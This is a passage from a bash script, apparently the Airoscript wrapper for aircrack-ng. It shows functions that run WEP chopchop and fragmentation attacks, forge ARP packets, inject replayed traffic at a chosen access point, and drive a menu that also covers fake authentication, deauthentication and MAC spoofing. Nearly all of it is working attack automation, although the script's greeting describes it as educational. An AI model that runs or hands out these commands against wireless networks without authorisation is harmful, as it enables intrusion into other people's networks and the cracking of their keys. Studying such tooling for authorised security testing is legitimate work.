	 xterm $HOLD -title "Testing Injection" $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -e $AIREPLAY $WIFI --test & menufonction
}
# Experimental features
function chopchopattack {
	clear
rm -rf $DUMP_PATH/$Host_MAC*
	capture &  fakeauth &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -b $Host_MAC $WIFI & menufonction
}
function chopchopattackclient {
	clear
rm -rf $DUMP_PATH/$Host_MAC*
	capture &  xterm $HOLD -title "ChopChop'ing: $Host_SSID" $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -e $AIREPLAY --chopchop -h $Client_MAC $WIFI & menufonction
}
function chopchopend {
rm -rf $DUMP_PATH/chopchop_$Host_MAC*
	$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap $WIFI & menufonction
}
function chopchopclientend {
rm -rf $DUMP_PATH/chopchop_$Host_MAC*
	$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor
	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending chopchop to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap $WIFI & menufonction
}

function fragnoclient {
rm -rf fragment-*
rm -rf $DUMP_PATH/frag_*
rm -rf $DUMP_PATH/$Host_MAC*
killall -9 airodump-ng aireplay-ng
iwconfig $WIFI rate 1M channel $Host_CHAN mode monitor
xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $FAKE_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture & fakeauth &  menufonction
}
function fragnoclientend {
iwconfig $WIFI rate 1M
$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
}
function fragmentationattack {
rm -rf fragment-*
rm -rf $DUMP_PATH/frag_*
rm -rf $DUMP_PATH/$Host_MAC*
killall -9 airodump-ng aireplay-ng
iwconfig $WIFI rate 2M channel $Host_CHAN mode monitor
xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Fragmentation attack on $Host_SSID" -e $AIREPLAY -5 -b $Host_MAC -h $Client_MAC -k $FRAG_CLIENT_IP -l $FRAG_HOST_IP $WIFI & capture &  menufonction
}

function fragmentationattackend {
iwconfig $WIFI rate 2M
$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#1DFF00" -title "Injecting forged packet on $Host_SSID" -e $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -x $INJECTRATE $WIFI & menufonction
}

function pskarp {
rm -rf $DUMP_PATH/arp_*.cap
	$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y $DUMP_PATH/dump*.xor -w $DUMP_PATH/arp_$Host_MAC.cap 	
	capture & xterm $HOLD $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "Sending forged ARP to: $Host_SSID" -e $AIREPLAY --interactive -r $DUMP_PATH/arp_$Host_MAC.cap $WIFI & menufonction
}


function menufonction {
xterm $HOLD $TOPRIGHT -title "Fake function to jump to menu" -e echo "Aircrack-ng is a great tool, Mister_X ASPj HIRTE are GODS"
}

function checkdir {
if [[ -d $DUMP_PATH ]]
then
clear
else
echo "output folder does not exist, i will create it now"
        mkdir $DUMP_PATH
fi
}
function greetings {
if [ $WELCOME = 1 ]
	then
echo "Welcome to Airoscript"
echo ""
echo "Airoscript is an educational tool designed to "
echo "encourage shell scripting and WIFI security learning"
echo ""
echo "Before you continue make sure you have set proper settings"
echo "Open this script in a text editor and configure variables"
echo ""
echo "Than you could set your interface and check binaries path"
echo "If you encounter errors please set the variable DEBUG to 1"
echo "This will allow you to see errors messages in xterm"
sleep 10
	else
clear
fi
}

##################################################################################
#
# Main Section this is the "menu" part, where all the functions are called		
#
#
	modprobe rtc
	clear
	checkdir
	greetings
	setinterface
	debug
	menu	
select choix in $CHOICES; do					
	if [ "$choix" = "1" ]; then
	choosetype
	choosescan
	clear
	menu
        echo "#######################################"
	echo "### Airodump closed, select a target###"				
	elif [ "$choix" = "2" ]; then
	Parseforap
	clear
	choosetarget
	if [ "$Host_SSID" = $'\r' ]
 	then blankssid;
	target
	menu
	elif [ "$Host_SSID" = "No SSID has been detected!" ]
	then blankssid;
	target
	menu
	else
	target
	echo " "
	menu
	fi					
	elif [ "$choix" = "3" ]; then
#	$AIRMON start $WIFI $Host_CHAN
#	iwconfig $WIFI rate $Host_SPEED"M"
#	iwconfig $WIFI rate 1M
#	echo "iwconfig $WIFI rate $Host_SPEED"M""
#	echo "iwconfig $WIFI rate 1"M""
	witchattack	
	clear
	target
	sleep 2;
	menu
	elif [ "$choix" = "4" ]; then
	witchcrack
	menu
	elif [ "$choix" = "5" ]; then
	witchconfigure
	menu	
	elif [ "$choix" = "6" ]; then
	echo launching fake auth commands
	choosefake && menu	
	elif [ "$choix" = "7" ]; then	
	choosedeauth
	menu
	elif [ "$choix" = "8" ]; then
	cleanup
	menu
	elif [ "$choix" = "9" ]; then
	monitor_interface
	menu
	elif [ "$choix" = "11" ]; then
	$AIRMON start $WIFI $Host_CHAN
	airomatic
	menu
	elif [ "$choix" = "12" ]; then
	wichchangemac
	menu
	elif [ "$choix" = "10" ]; then
	echo Script terminated
exit			
	else
	clear
	menu
        echo "#######################################"
        echo "###      Wrong number entered       ###"
	fi
done
#END

